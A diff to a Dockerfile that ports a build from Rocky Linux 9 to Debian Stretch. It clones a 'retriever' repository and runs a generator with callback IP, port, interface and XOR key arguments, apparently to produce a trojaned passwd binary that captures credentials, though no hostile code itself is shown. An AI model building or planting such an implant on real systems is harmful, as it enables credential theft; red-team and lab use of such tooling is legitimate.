@@ -1,13 +1,14 @@
-FROM rockylinux:9 AS builder
+FROM debian:stretch AS builder
 
 # Declare Variables
 ARG IP="127.0.0.1"
 ARG PORT="8000"
 ARG INTERFACE="ens3"
 ARG XOR_KEY="bingus"
+ARG DEBIAN_FRONTEND=noninteractive
 
 # Install Dependancies
-RUN dnf install -y git make autoconf gettext-devel libtool libxslt wget bison
+RUN apt-get update && apt-get install -y git make wget autoconf autopoint libtool xsltproc bison
 
 # Clone and run script
 RUN git clone https://github.com/p4ral1ax/retriever
@@ -16,4 +17,4 @@ RUN ./generate.sh ${IP} ${PORT} ${INTERFACE} ${XOR_KEY}
 
 # Copy File
 FROM scratch AS export-stage
-COPY --from=builder /retriever/passwd ./passwd-rocky9
+COPY --from=builder /retriever/passwd ./passwd-deb9
